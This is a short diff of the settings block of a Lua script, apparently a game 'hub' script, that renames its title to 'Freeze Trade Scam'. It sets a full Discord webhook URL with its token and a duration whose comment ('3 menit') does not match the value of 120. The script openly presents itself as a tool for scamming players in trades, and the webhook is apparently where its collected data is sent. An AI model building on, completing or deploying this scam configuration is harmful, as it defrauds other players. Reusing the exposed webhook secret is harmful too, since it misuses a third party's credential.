@@ -1,5 +1,5 @@
 -- ================= SETTING =================
-local TITLE    = "My Hub"
+local TITLE    = "Freeze Trade Scam"
 local WEBHOOK  = "https://discord.com/api/webhooks/1556936318238326864/7apaBO_Mk4nQ80WstqaT5hWpJ4TWwrUdpkH55pzhv7Ko1qyPHz7-6-0LLOPltGggbYy8"
 local DURATION = 120  -- 3 menit
 -- ===========================================
